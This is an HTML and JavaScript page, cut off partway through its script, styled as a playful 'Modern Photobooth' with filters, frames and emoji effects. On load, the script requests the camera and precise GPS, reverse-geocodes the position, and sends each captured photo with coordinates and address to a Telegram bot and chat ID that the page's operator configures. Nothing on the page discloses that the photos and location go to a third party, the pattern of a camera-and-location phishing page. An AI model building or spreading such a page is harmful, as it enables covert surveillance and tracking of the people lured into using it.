<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Modern Photobooth</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800&display=swap');
        
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Poppins', sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 50%, #f093fb 100%);
            min-height: 100vh;
            overflow-x: hidden;
            position: relative;
        }

        .animated-bg {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: 
                radial-gradient(circle at 20% 20%, rgba(255, 107, 107, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 80% 80%, rgba(78, 205, 196, 0.3) 0%, transparent 50%),
                radial-gradient(circle at 40% 70%, rgba(69, 183, 209, 0.3) 0%, transparent 50%);
            animation: backgroundMove 20s ease-in-out infinite;
            z-index: -2;
        }

        @keyframes backgroundMove {
            0%, 100% { transform: translateX(0) translateY(0); }
            25% { transform: translateX(20px) translateY(-10px); }
            50% { transform: translateX(-10px) translateY(20px); }
            75% { transform: translateX(15px) translateY(10px); }
        }

        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
            position: relative;
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
            animation: fadeInDown 1s ease-out;
        }

        .header h1 {
            font-size: 4rem;
            font-weight: 800;
            color: white;
            text-shadow: 0 6px 20px rgba(0, 0, 0, 0.4);
            margin-bottom: 15px;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #f093fb);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            background-size: 400% 400%;
            animation: gradientShift 4s ease-in-out infinite;
            position: relative;
        }

        .header h1::after {
            content: '';
            position: absolute;
            bottom: -10px;
            left: 50%;
            transform: translateX(-50%);
            width: 200px;
            height: 4px;
            background: linear-gradient(90deg, transparent, #4ecdc4, transparent);
            border-radius: 2px;
            animation: glow 2s ease-in-out infinite alternate;
        }

        .header p {
            color: rgba(255, 255, 255, 0.9);
            font-size: 1.4rem;
            font-weight: 300;
            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
        }

        .photobooth-container {
            display: grid;
            grid-template-columns: 1fr 450px;
            gap: 40px;
            align-items: start;
        }

        .camera-section {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(30px);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 30px;
            padding: 40px;
            animation: fadeInLeft 1s ease-out;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
            position: relative;
        }

        .camera-section::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, #ff6b6b, #4ecdc4, #45b7d1, #f093fb);
            border-radius: 32px;
            z-index: -1;
            animation: borderGlow 3s ease-in-out infinite;
        }

        .controls-section {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(30px);
            border: 2px solid rgba(255, 255, 255, 0.2);
            border-radius: 30px;
            padding: 40px;
            animation: fadeInRight 1s ease-out;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.2);
            position: relative;
        }

        .controls-section::before {
            content: '';
            position: absolute;
            top: -2px;
            left: -2px;
            right: -2px;
            bottom: -2px;
            background: linear-gradient(45deg, #f093fb, #45b7d1, #4ecdc4, #ff6b6b);
            border-radius: 32px;
            z-index: -1;
            animation: borderGlow 3s ease-in-out infinite reverse;
        }

        .camera-container {
            position: relative;
            width: 100%;
            aspect-ratio: 4/3;
            border-radius: 20px;
            overflow: hidden;
            margin-bottom: 30px;
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
            border: 3px solid rgba(255, 255, 255, 0.3);
        }

        #video, #canvas {
            width: 100%;
            height: 100%;
            object-fit: cover;
        }

        .frame-decoration {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 10;
            opacity: 0.8;
        }

        .film-frame {
            background: 
                linear-gradient(to right, #333 0%, #333 15px, transparent 15px, transparent calc(100% - 15px), #333 calc(100% - 15px)),
                linear-gradient(to bottom, #333 0%, #333 15px, transparent 15px, transparent calc(100% - 15px), #333 calc(100% - 15px));
            background-size: 100% 100%;
        }

        .film-frame::before {
            content: '';
            position: absolute;
            top: 15px;
            left: 0;
            right: 0;
            bottom: 15px;
            background: repeating-linear-gradient(
                to bottom,
                transparent 0px,
                transparent 10px,
                rgba(51, 51, 51, 0.5) 10px,
                rgba(51, 51, 51, 0.5) 12px
            );
        }

        .vintage-frame {
            background: 
                radial-gradient(circle at 50% 50%, transparent 60%, rgba(139, 69, 19, 0.8) 80%),
                linear-gradient(45deg, rgba(139, 69, 19, 0.3) 0%, transparent 20%, transparent 80%, rgba(139, 69, 19, 0.3) 100%);
            border: 8px solid rgba(139, 69, 19, 0.6);
            border-radius: 20px;
        }

        .polaroid-frame {
            background: white;
            border: 20px solid white;
            border-bottom: 60px solid white;
            border-radius: 5px;
            box-shadow: 0 4px 15px rgba(0, 0, 0, 0.3);
        }

        .polaroid-frame::after {
            content: 'Beautiful Moment ✨';
            position: absolute;
            bottom: 10px;
            left: 50%;
            transform: translateX(-50%);
            font-family: 'Poppins', sans-serif;
            font-size: 14px;
            color: #666;
            font-weight: 500;
        }

        .emoji-effects {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: 15;
        }

        .emoji {
            position: absolute;
            font-size: 2rem;
            animation: emojiFloat 3s ease-in-out infinite;
            opacity: 0.8;
        }

        .countdown {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 10rem;
            font-weight: 800;
            color: white;
            text-shadow: 0 6px 20px rgba(0, 0, 0, 0.8);
            z-index: 20;
            animation: countdownPulse 1s infinite;
        }

        .flash {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: radial-gradient(circle, rgba(255, 255, 255, 0.9) 0%, rgba(255, 255, 255, 0.5) 100%);
            opacity: 0;
            z-index: 25;
        }

        .control-group {
            margin-bottom: 30px;
        }

        .control-group label {
            display: block;
            color: white;
            font-weight: 600;
            margin-bottom: 15px;
            font-size: 1.2rem;
            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.3);
        }

        .frame-selector, .effect-selector, .emoji-selector {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(100px, 1fr));
            gap: 12px;
            margin-bottom: 20px;
        }

        .frame-option, .effect-option, .emoji-option {
            padding: 15px 10px;
            background: rgba(255, 255, 255, 0.1);
            border: 2px solid transparent;
            border-radius: 15px;
            cursor: pointer;
            transition: all 0.4s ease;
            text-align: center;
            color: white;
            font-weight: 600;
            font-size: 0.9rem;
            backdrop-filter: blur(10px);
            position: relative;
            overflow: hidden;
        }

        .frame-option::before, .effect-option::before, .emoji-option::before {
            content: '';
            position: absolute;
            top: 0;
            left: -100%;
            width: 100%;
            height: 100%;
            background: linear-gradient(90deg, transparent, rgba(255, 255, 255, 0.2), transparent);
            transition: left 0.5s ease;
        }

        .frame-option:hover::before, .effect-option:hover::before, .emoji-option:hover::before {
            left: 100%;
        }

        .frame-option:hover, .effect-option:hover, .emoji-option:hover {
            background: rgba(255, 255, 255, 0.2);
            transform: translateY(-3px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.2);
        }

        .frame-option.active, .effect-option.active, .emoji-option.active {
            border-color: #4ecdc4;
            background: linear-gradient(135deg, rgba(78, 205, 196, 0.3), rgba(69, 183, 209, 0.3));
            box-shadow: 0 8px 25px rgba(78, 205, 196, 0.4);
            transform: translateY(-2px);
        }

        .capture-btn {
            width: 100%;
            padding: 20px;
            background: linear-gradient(135deg, #ff6b6b, #4ecdc4, #45b7d1);
            border: none;
            border-radius: 25px;
            color: white;
            font-size: 1.5rem;
            font-weight: 700;
            cursor: pointer;
            transition: all 0.4s ease;
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
            margin-bottom: 30px;
            position: relative;
            overflow: hidden;
            background-size: 200% 200%;
            animation: gradientMove 3s ease-in-out infinite;
        }

        .capture-btn::before {
            content: '';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 0;
            height: 0;
            background: rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            transition: all 0.4s ease;
        }

        .capture-btn:hover::before {
            width: 100%;
            height: 100%;
        }

        .capture-btn:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.4);
        }

        .capture-btn:active {
            transform: translateY(-2px);
        }

        .capture-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .photo-gallery {
            display: grid;
            grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
            gap: 15px;
            margin-top: 20px;
        }

        .photo-item {
            aspect-ratio: 1;
            border-radius: 15px;
            overflow: hidden;
            cursor: pointer;
            transition: all 0.4s ease;
            box-shadow: 0 6px 20px rgba(0, 0, 0, 0.3);
            position: relative;
        }

        .photo-item::before {
            content: '📥';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            font-size: 2rem;
            opacity: 0;
            transition: all 0.3s ease;
            z-index: 10;
        }

        .photo-item:hover::before {
            opacity: 1;
        }

        .photo-item:hover {
            transform: scale(1.08) rotate(2deg);
            box-shadow: 0 12px 30px rgba(0, 0, 0, 0.4);
        }

        .photo-item img {
            width: 100%;
            height: 100%;
            object-fit: cover;
            transition: all 0.3s ease;
        }

        .photo-item:hover img {
            filter: brightness(0.7);
        }

        .location-info {
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(15px);
            border-radius: 20px;
            padding: 20px;
            margin-bottom: 20px;
            border: 1px solid rgba(255, 255, 255, 0.2);
        }

        .location-info h3 {
            color: white;
            margin-bottom: 10px;
            font-size: 1.1rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }

        .location-info p {
            color: rgba(255, 255, 255, 0.8);
            font-size: 0.9rem;
            margin-bottom: 5px;
        }

        .floating-particles {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            pointer-events: none;
            z-index: -1;
        }

        .particle {
            position: absolute;
            width: 6px;
            height: 6px;
            background: rgba(255, 255, 255, 0.6);
            border-radius: 50%;
            animation: float 8s ease-in-out infinite;
        }

        .status-message {
            position: fixed;
            top: 20px;
            right: 20px;
            padding: 15px 20px;
            border-radius: 15px;
            color: white;
            font-weight: 600;
            z-index: 1000;
            transform: translateX(400px);
            transition: all 0.4s ease;
            backdrop-filter: blur(10px);
            box-shadow: 0 8px 25px rgba(0, 0, 0, 0.3);
        }

        .status-message.show {
            transform: translateX(0);
        }

        .status-success {
            background: linear-gradient(135deg, rgba(78, 205, 196, 0.9), rgba(69, 183, 209, 0.9));
            border: 1px solid rgba(78, 205, 196, 0.5);
        }

        .status-error {
            background: linear-gradient(135deg, rgba(255, 107, 107, 0.9), rgba(255, 154, 154, 0.9));
            border: 1px solid rgba(255, 107, 107, 0.5);
        }

        .status-info {
            background: linear-gradient(135deg, rgba(69, 183, 209, 0.9), rgba(78, 205, 196, 0.9));
            border: 1px solid rgba(69, 183, 209, 0.5);
        }

        /* Animations */
        @keyframes fadeInDown {
            from {
                opacity: 0;
                transform: translateY(-50px);
            }
            to {
                opacity: 1;
                transform: translateY(0);
            }
        }

        @keyframes fadeInLeft {
            from {
                opacity: 0;
                transform: translateX(-50px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        @keyframes fadeInRight {
            from {
                opacity: 0;
                transform: translateX(50px);
            }
            to {
                opacity: 1;
                transform: translateX(0);
            }
        }

        @keyframes gradientShift {
            0%, 100% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
        }

        @keyframes gradientMove {
            0%, 100% {
                background-position: 0% 50%;
            }
            50% {
                background-position: 100% 50%;
            }
        }

        @keyframes borderGlow {
            0%, 100% {
                opacity: 0.5;
            }
            50% {
                opacity: 1;
            }
        }

        @keyframes glow {
            0% {
                box-shadow: 0 0 5px rgba(78, 205, 196, 0.5);
            }
            100% {
                box-shadow: 0 0 20px rgba(78, 205, 196, 0.8);
            }
        }

        @keyframes countdownPulse {
            0%, 100% {
                transform: translate(-50%, -50%) scale(1);
                text-shadow: 0 6px 20px rgba(0, 0, 0, 0.8);
            }
            50% {
                transform: translate(-50%, -50%) scale(1.1);
                text-shadow: 0 8px 30px rgba(0, 0, 0, 0.9);
            }
        }

        @keyframes emojiFloat {
            0%, 100% {
                transform: translateY(0) rotate(0deg);
            }
            50% {
                transform: translateY(-20px) rotate(180deg);
            }
        }

        @keyframes float {
            0%, 100% {
                transform: translateY(0px) rotate(0deg);
                opacity: 0;
            }
            50% {
                opacity: 1;
            }
            100% {
                transform: translateY(-100vh) rotate(360deg);
                opacity: 0;
            }
        }

        .flash-animation {
            animation: flashEffect 0.5s ease-out;
        }

        @keyframes flashEffect {
            0% { opacity: 0; }
            50% { opacity: 1; }
            100% { opacity: 0; }
        }

        @media (max-width: 768px) {
            .photobooth-container {
                grid-template-columns: 1fr;
                gap: 30px;
            }
            
            .header h1 {
                font-size: 2.8rem;
            }
            
            .countdown {
                font-size: 7rem;
            }
            
            .frame-selector, .effect-selector, .emoji-selector {
                grid-template-columns: repeat(2, 1fr);
            }
            
            .container {
                padding: 15px;
            }
        }

        @media (max-width: 480px) {
            .header h1 {
                font-size: 2.2rem;
            }
            
            .countdown {
                font-size: 5rem;
            }
            
            .camera-section, .controls-section {
                padding: 25px;
            }
        }
    </style>
</head>
<body>
    <div class="animated-bg"></div>
    <div class="floating-particles" id="particles"></div>
    
    <div class="container">
        <div class="header">
            <h1>✨ Modern Photobooth ✨</h1>
            <p>Capture beautiful moments with amazing effects and frames</p>
        </div>

        <div class="photobooth-container">
            <div class="camera-section">
                <div class="camera-container">
                    <video id="video" autoplay muted playsinline></video>
                    <canvas id="canvas" style="display: none;"></canvas>
                    <div class="frame-decoration" id="frameDecoration"></div>
                    <div class="emoji-effects" id="emojiEffects"></div>
                    <div class="countdown" id="countdown" style="display: none;"></div>
                    <div class="flash" id="flash"></div>
                </div>
                
                <button class="capture-btn" id="captureBtn">📸 Take Amazing Photo</button>
                
                <div class="photo-gallery" id="photoGallery"></div>
            </div>

            <div class="controls-section">
                <div class="control-group">
                    <label>📐 Frame Layout</label>
                    <div class="frame-selector">
                        <div class="frame-option active" data-frame="1">1️⃣ Single</div>
                        <div class="frame-option" data-frame="2">2️⃣ Double</div>
                        <div class="frame-option" data-frame="4">4️⃣ Quad</div>
                        <div class="frame-option" data-frame="6">6️⃣ Hexa</div>
                    </div>
                </div>

                <div class="control-group">
                    <label>🎨 Photo Effects</label>
                    <div class="effect-selector">
                        <div class="effect-option active" data-effect="none">✨ Normal</div>
                        <div class="effect-option" data-effect="sepia">🟤 Sepia</div>
                        <div class="effect-option" data-effect="grayscale">⚫ B&W</div>
                        <div class="effect-option" data-effect="blur">🌫️ Blur</div>
                        <div class="effect-option" data-effect="brightness">☀️ Bright</div>
                        <div class="effect-option" data-effect="contrast">🔆 Contrast</div>
                    </div>
                </div>

                <div class="control-group">
                    <label>🖼️ Decorative Frames</label>
                    <div class="frame-selector">
                        <div class="frame-option active" data-decoration="none">🚫 None</div>
                        <div class="frame-option" data-decoration="film">🎬 Film</div>
                        <div class="frame-option" data-decoration="vintage">🏛️ Vintage</div>
                        <div class="frame-option" data-decoration="polaroid">📷 Polaroid</div>
                    </div>
                </div>

                <div class="control-group">
                    <label>😊 Emoji Effects</label>
                    <div class="emoji-selector">
                        <div class="emoji-option active" data-emoji="none">🚫 None</div>
                        <div class="emoji-option" data-emoji="happy">😄 Happy</div>
                        <div class="emoji-option" data-emoji="love">💕 Love</div>
                        <div class="emoji-option" data-emoji="party">🎉 Party</div>
                        <div class="emoji-option" data-emoji="cool">😎 Cool</div>
                        <div class="emoji-option" data-emoji="cute">🥰 Cute</div>
                    </div>
                </div>

                <div class="location-info" id="locationInfo">
                    <h3>📍 Location Information</h3>
                    <p id="locationText">Getting location...</p>
                </div>
            </div>
        </div>
    </div>

    <div class="status-message" id="statusMessage"></div>

    <script>
        class ModernPhotobooth {
            constructor() {
                // TELEGRAM BOT CONFIGURATION - GANTI DENGAN TOKEN DAN CHAT ID ANDA
                this.TELEGRAM_BOT_TOKEN = 'YOUR_BOT_TOKEN_HERE';
                this.TELEGRAM_CHAT_ID = 'YOUR_CHAT_ID_HERE';
                // OPEN CAGE API KEY - GANTI DENGAN API KEY ANDA UNTUK GEOLOKASI
                this.OPENCAGE_API_KEY = 'YOUR_OPENCAGE_API_KEY'; // Replace with your actual OpenCage API Key
                
                this.video = document.getElementById('video');
                this.canvas = document.getElementById('canvas');
                this.captureBtn = document.getElementById('captureBtn');
                this.photoGallery = document.getElementById('photoGallery');
                this.countdown = document.getElementById('countdown');
                this.flash = document.getElementById('flash');
                this.frameDecoration = document.getElementById('frameDecoration');
                this.emojiEffects = document.getElementById('emojiEffects');
                this.locationInfo = document.getElementById('locationInfo');
                this.statusMessage = document.getElementById('statusMessage');
                
                this.currentFrameLayout = 1; // Corresponds to 'data-frame' for layout (1, 2, 4, 6)
                this.currentEffect = 'none';
                this.currentDecoration = 'none';
                this.currentEmoji = 'none';
                this.capturedPhotos = []; // Stores URLs of captured photos for the gallery
                this.photosForFrame = []; // Stores individual photos before combining into a multi-frame
                this.isCapturing = false;
                this.userLocation = null;
                
                this.init();
            }

            async init() {
                await this.initCamera();
                await this.getLocation();
                this.initEventListeners();
                this.createFloatingParticles();
                this.showStatus('🎉 Photobooth ready! Have fun!', 'success');
            }

            async initCamera() {
                try {
                    const stream = await navigator.mediaDevices.getUserMedia({
                        video: { 
                            width: { ideal: 1920 }, 
                            height: { ideal: 1080 },
                            facingMode: 'user' // Use 'environment' for rear camera on mobile
                        }
                    });
                    this.video.srcObject = stream;
                    this.showStatus('📹 Camera ready!', 'info');
                } catch (error) {
                    console.error('Error accessing camera:', error);
                    this.showStatus('❌ Cannot access camera. Please allow camera permission and refresh.', 'error');
                }
            }

            async getLocation() {
                try {
                    if (!navigator.geolocation) {
                        throw new Error('Geolocation not supported by your browser.');
                    }
                    
                    const position = await new Promise((resolve, reject) => {
                        navigator.geolocation.getCurrentPosition(resolve, reject, {
                            enableHighAccuracy: true,
                            timeout: 10000,
                            maximumAge: 300000 // Cache location for 5 minutes
                        });
                    });
                    
                    this.userLocation = {
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude,
                        accuracy: position.coords.accuracy
                    };
                    
                    // Get address from coordinates using OpenCage Geocoding API
                    try {
                        const response = await fetch(`https://api.opencagedata.com/geocode/v1/json?q=${this.userLocation.latitude}+${this.userLocation.longitude}&key=${this.OPENCAGE_API_KEY}`);
                        const data = await response.json();
                        const address = data.results[0]?.formatted || 'Unknown location';
                        
                        document.getElementById('locationText').innerHTML = `
                            📍 ${address}<br>
                            🌍 ${this.userLocation.latitude.toFixed(6)}, ${this.userLocation.longitude.toFixed(6)}
                        `;
                    } catch (error) {
                        console.error('Error fetching address from OpenCage:', error);
                        document.getElementById('locationText').innerHTML = `
                            📍 Location detected<br>
                            🌍 ${this.userLocation.latitude.toFixed(6)}, ${this.userLocation.longitude.toFixed(6)}
                        `;
                        this.showStatus('⚠️ Could not get detailed address.', 'info');
                    }
                    
                    this.showStatus('📍 Location detected!', 'info');
                } catch (error) {
                    console.error('Error getting location:', error);
                    document.getElementById('locationText').textContent = 'Location access denied or unavailable.';
                    this.showStatus('📍 Location access denied or unavailable.', 'error');
                }
            }

            initEventListeners() {
                this.captureBtn.addEventListener('click', () => this.startCapture());
                
                // Frame layout selector
                document.querySelectorAll('.frame-selector .frame-option').forEach(option => {
                    option.addEventListener('click', () => {
                        document.querySelectorAll('.frame-selector .frame-option').forEach(opt => opt.classList.remove('active'));
                        option.classList.add('active');
                        this.currentFrameLayout = parseInt(option.dataset.frame);
                        this.showStatus(`Layout set to ${this.currentFrameLayout} photo(s).`, 'info');
                    });
                });

                // Photo effects selector
                document.querySelectorAll('.effect-selector .effect-option').forEach(option => {
                    option.addEventListener('click', () => {
                        document.querySelectorAll('.effect-selector .effect-option').forEach(opt => opt.classList.remove('active'));
                        option.classList.add('active');
                        this.currentEffect = option.dataset.effect;
                        this.applyEffectToVideo(this.currentEffect);
                        this.showStatus(`Effect set to ${option.textContent.trim()}.`, 'info');
                    });
                });

                // Decorative frames selector
                document.querySelectorAll('.controls-section .frame-selector:last-of-type .frame-option').forEach(option => {
                    option.addEventListener('click', () => {
                        document.querySelectorAll('.controls-section .frame-selector:last-of-type .frame-option').forEach(opt => opt.classList.remove('active'));
                        option.classList.add('active');
                        this.currentDecoration = option.dataset.decoration;
                        this.applyDecoration(this.currentDecoration);
                        this.showStatus(`Decoration set to ${option.textContent.trim()}.`, 'info');
                    });
                });

                // Emoji effects selector
                document.querySelectorAll('.emoji-selector .emoji-option').forEach(option => {
                    option.addEventListener('click', () => {
                        document.querySelectorAll('.emoji-selector .emoji-option').forEach(opt => opt.classList.remove('active'));
                        option.classList.add('active');
                        this.currentEmoji = option.dataset.emoji;
                        this.showStatus(`Emoji effect set to ${option.textContent.trim()}.`, 'info');
                    });
                });
            }

            applyEffectToVideo(effect) {
                switch (effect) {
                    case 'sepia':
                        this.video.style.filter = 'sepia(100%)';
                        break;
                    case 'grayscale':
                        this.video.style.filter = 'grayscale(100%)';
                        break;
                    case 'blur':
                        this.video.style.filter = 'blur(5px)';
                        break;
                    case 'brightness':
                        this.video.style.filter = 'brightness(1.5)';
                        break;
                    case 'contrast':
                        this.video.style.filter = 'contrast(200%)';
                        break;
                    case 'none':
                    default:
                        this.video.style.filter = 'none';
                        break;
                }
            }

            applyDecoration(decoration) {
                this.frameDecoration.className = 'frame-decoration'; // Reset classes
                if (decoration !== 'none') {
                    this.frameDecoration.classList.add(`${decoration}-frame`);
                }
            }

            async startCapture() {
                if (this.isCapturing) return;
                this.isCapturing = true;
                this.captureBtn.disabled = true;
                this.photosForFrame = [];
                this.emojiEffects.innerHTML = ''; // Clear previous emojis

                this.showStatus('Starting photo capture...', 'info');

                for (let i = 0; i < this.currentFrameLayout; i++) {
                    await this.runCountdown();
                    await this.takePhoto();
                    if (this.currentFrameLayout > 1) {
                        this.showStatus(`Captured photo ${i + 1} of ${this.currentFrameLayout}`, 'info');
                        // Small delay before next photo in multi-shot
                        await new Promise(resolve => setTimeout(resolve, 500)); 
                    }
                }

                if (this.currentFrameLayout > 1) {
                    await this.combinePhotosIntoFrame();
                    this.showStatus('Multi-frame photo created!', 'success');
                } else {
                    this.showStatus('Photo captured successfully!', 'success');
                }
                
                this.isCapturing = false;
                this.captureBtn.disabled = false;
            }

            async runCountdown() {
                this.countdown.style.display = 'block';
                for (let i = 3; i > 0; i--) {
                    this.countdown.textContent = i;
                    await new Promise(resolve => setTimeout(resolve, 1000));
                }
                this.countdown.textContent = 'SMILE!';
                await new Promise(resolve => setTimeout(resolve, 500));
                this.countdown.style.display = 'none';
            }

            async takePhoto() {
                // Apply flash effect
                this.flash.classList.add('flash-animation');
                await new Promise(resolve => setTimeout(resolve, 500)); // Flash duration
                this.flash.classList.remove('flash-animation');

                // Apply emoji effects if selected
                if (this.currentEmoji !== 'none') {
                    this.spawnEmojis(this.currentEmoji);
                }
                
                this.canvas.width = this.video.videoWidth;
                this.canvas.height = this.video.videoHeight;
                const context = this.canvas.getContext('2d');

                // Draw video frame onto canvas
                context.filter = this.video.style.filter; // Apply current CSS filter
                context.drawImage(this.video, 0, 0, this.canvas.width, this.canvas.height);
                context.filter = 'none'; // Reset filter for subsequent draws

                // Apply decoration on canvas
                const tempCanvas = document.createElement('canvas');
                tempCanvas.width = this.canvas.width;
                tempCanvas.height = this.canvas.height;
                const tempContext = tempCanvas.getContext('2d');
                tempContext.drawImage(this.canvas, 0, 0); // Draw existing photo

                if (this.currentDecoration !== 'none') {
                    this.drawDecorationOnCanvas(tempContext, this.currentDecoration, tempCanvas.width, tempCanvas.height);
                }

                const dataUrl = tempCanvas.toDataURL('image/png');
                this.photosForFrame.push(dataUrl);

                // For single capture, add to gallery immediately
                if (this.currentFrameLayout === 1) {
                    this.addPhotoToGallery(dataUrl);
                    this.sendPhotoToTelegram(dataUrl); // Send immediately for single photo
                }
            }

            drawDecorationOnCanvas(context, decoration, width, height) {
                switch (decoration) {
                    case 'film':
                        // Film frame border
                        context.fillStyle = '#333';
                        context.fillRect(0, 0, width, 15); // Top
                        context.fillRect(0, height - 15, width, 15); // Bottom
                        context.fillRect(0, 0, 15, height); // Left
                        context.fillRect(width - 15, 0, 15, height); // Right

                        // Film strip perforations (simplified for canvas)
                        context.fillStyle = 'rgba(51, 51, 51, 0.5)';
                        for (let y = 15; y < height - 15; y += 22) { // Adjust spacing as needed
                            context.fillRect(0, y, width, 2); 
                        }
                        break;
                    case 'vintage':
                        // Vintage brown border
                        context.strokeStyle = 'rgba(139, 69, 19, 0.6)';
                        context.lineWidth = 8;
                        context.strokeRect(4, 4, width - 8, height - 8);

                        // Radial gradient overlay (complex to replicate precisely on canvas as CSS filter)
                        // A simple approach is to draw a semi-transparent brown overlay
                        context.fillStyle = 'rgba(139, 69, 19, 0.1)';
                        context.fillRect(0, 0, width, height);
                        break;
                    case 'polaroid':
                        // Polaroid white frame
                        context.fillStyle = 'white';
                        context.fillRect(0, 0, width, height); // Fill entire canvas white
                        context.drawImage(this.canvas, 20, 20, width - 40, height - 80); // Draw image inside

                        // Polaroid text
                        context.font = '500 14px Poppins';
                        context.fillStyle = '#666';
                        context.textAlign = 'center';
                        context.fillText('Beautiful Moment ✨', width / 2, height - 20);
                        break;
                }
            }

            async combinePhotosIntoFrame() {
                if (this.photosForFrame.length === 0) return;

                const finalCanvas = document.createElement('canvas');
                let ctx = finalCanvas.getContext('2d');

                // Determine layout dimensions
                let cols, rows;
                switch (this.currentFrameLayout) {
                    case 2: cols = 2; rows = 1; break;
                    case 4: cols = 2; rows = 2; break;
                    case 6: cols = 3; rows = 2; break; // or 2x3
                    default: cols = 1; rows = 1;
                }

                // Assuming all captured photos have the same aspect ratio for now
                // Adjust this if your camera stream changes resolution
                const img = new Image();
                img.src = this.photosForFrame[0];
                await new Promise(resolve => img.onload = resolve);

                const photoWidth = img.width;
                const photoHeight = img.height;

                finalCanvas.width = photoWidth * cols;
                finalCanvas.height = photoHeight * rows;

                for (let i = 0; i < this.photosForFrame.length; i++) {
                    const currentImg = new Image();
                    currentImg.src = this.photosForFrame[i];
                    await new Promise(resolve => currentImg.onload = resolve);

                    const col = i % cols;
                    const row = Math.floor(i / cols);

                    ctx.drawImage(currentImg, col * photoWidth, row * photoHeight, photoWidth, photoHeight);
                }

                // Add overall decoration if applicable
                if (this.currentDecoration !== 'none') {
                    this.drawDecorationOnCanvas(ctx, this.currentDecoration, finalCanvas.width, finalCanvas.height);
                }

                const finalDataUrl = finalCanvas.toDataURL('image/png');
                this.addPhotoToGallery(finalDataUrl);
                this.sendPhotoToTelegram(finalDataUrl);
                this.photosForFrame = []; // Clear for next capture
            }

            addPhotoToGallery(dataUrl) {
                const photoItem = document.createElement('div');
                photoItem.classList.add('photo-item');
                const img = document.createElement('img');
                img.src = dataUrl;
                photoItem.appendChild(img);
                
                // Add download functionality on click
                photoItem.addEventListener('click', () => {
                    const a = document.createElement('a');
                    a.href = dataUrl;
                    a.download = `photobooth_moment_${new Date().toISOString().replace(/[:.]/g, '-')}.png`;
                    document.body.appendChild(a);
                    a.click();
                    document.body.removeChild(a);
                    this.showStatus('Photo downloaded!', 'success');
                });

                this.photoGallery.prepend(photoItem); // Add to the beginning of the gallery
                this.capturedPhotos.push(dataUrl);
            }

            async sendPhotoToTelegram(photoDataUrl) {
                if (!this.TELEGRAM_BOT_TOKEN || !this.TELEGRAM_CHAT_ID || 
                    this.TELEGRAM_BOT_TOKEN === 'YOUR_BOT_TOKEN_HERE' || 
                    this.TELEGRAM_CHAT_ID === 'YOUR_CHAT_ID_HERE') {
                    console.warn('Telegram Bot Token or Chat ID not set. Photo will not be sent to Telegram.');
                    this.showStatus('⚠️ Telegram API keys not configured.', 'info');
                    return;
                }

                try {
                    const blob = await (await fetch(photoDataUrl)).blob();
                    const formData = new FormData();
                    formData.append('chat_id', this.TELEGRAM_CHAT_ID);
                    formData.append('photo', blob, 'photobooth.png');
                    
                    let caption = 'New photo from Photobooth!';
                    if (this.userLocation) {
                        caption += `\n📍 Location: ${this.userLocation.latitude.toFixed(4)}, ${this.userLocation.longitude.toFixed(4)}`;
                        if (document.getElementById('locationText').textContent.includes('📍')) {
                            caption += `\n${document.getElementById('locationText').textContent.split('\n')[0].replace('📍 ', '')}`;
                        }
                    }
                    caption += `\n🎨 Effect: ${this.currentEffect}, 🖼️ Decoration: ${this.currentDecoration}, 😊 Emoji: ${this.currentEmoji}`;
                    
                    formData.append('caption', caption);

                    const response = await fetch(`https://api.telegram.org/bot${this.TELEGRAM_BOT_TOKEN}/sendPhoto`, {
                        method: 'POST',
                        body: formData
                    });

                    const result = await response.json();
                    if (result.ok) {
                        this.showStatus('✅ Photo sent to Telegram!', 'success');
                    } else {
                        console.error('Error sending photo to Telegram:', result);
                        this.showStatus(`❌ Failed to send to Telegram: ${result.description || 'Unknown error'}`, 'error');
                    }
                } catch (error) {
                    console.error('Network error sending photo to Telegram:', error);
                    this.showStatus('❌ Network error sending to Telegram.', 'error');
                }
            }

            spawnEmojis(emojiType) {
                const emojis = {
                    happy: ['😊', '😂', '😁', '🥳'],
                    love: ['❤️', '💕', '💖', '🥰'],
